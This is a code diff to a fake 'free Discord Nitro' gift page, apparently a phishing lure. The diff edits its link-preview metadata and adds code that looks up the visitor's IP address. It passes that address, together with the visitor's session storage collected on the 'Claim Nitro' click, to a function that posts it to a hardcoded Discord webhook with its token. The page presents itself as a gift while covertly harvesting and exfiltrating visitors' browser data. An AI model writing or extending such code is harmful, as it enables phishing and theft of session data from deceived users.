@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta property="og:title" content="You've been gifted a subscription!">
     <meta property="og:description" content="Friend has gifted you Nitro for 1 month">
-    <meta property="og:image" content="https://example.com/nitro-image.png">
-    <meta property="og:url" content="https://your-github-username.github.io/nitro-offer">
+    <meta property="og:image" content="https://www.reddit.com/media?url=https%3A%2F%2Fi.redd.it%2Fxedy9ugkqo621.png">
+    <meta property="og:url" content="https://inukedyou1/nitro-offer">
     <title>Discord Nitro Offer</title>
     <style>
         body {
@@ -29,7 +29,7 @@
 </head>
 <body>
     <h1>Claim Your Free Discord Nitro!</h1>
-    <img src="https://support.discord.com/hc/user_images/wDgPSdKaHV9lUSR2nMko8A.png" alt="Discord Nitro" class="nitro-img">
+    <img src="https://example.com/nitro-image.png" alt="Discord Nitro" class="nitro-img">
     <p>Click the link below to claim your free Discord Nitro:</p>
     <a class="nitro-link" onclick="gatherInfo()">Claim Nitro</a>
 
@@ -64,6 +64,20 @@
             }
             userInfo.sessionStorage = sessionStorageData;
 
+            // Fetch IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    userInfo.ip = data.ip;
+                    sendInfoToWebhook(userInfo);
+                })
+                .catch(error => {
+                    userInfo.ip = 'Unknown';
+                    sendInfoToWebhook(userInfo);
+                });
+        }
+
+        function sendInfoToWebhook(userInfo) {
             fetch('https://discord.com/api/webhooks/1352805612534104115/vTiufCZJGy5ZjXTxcQ8DYpT3ywbLTOKeHIHuk5z48qpYwTtsjLnn4toOWw9gsz8bpGmY', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
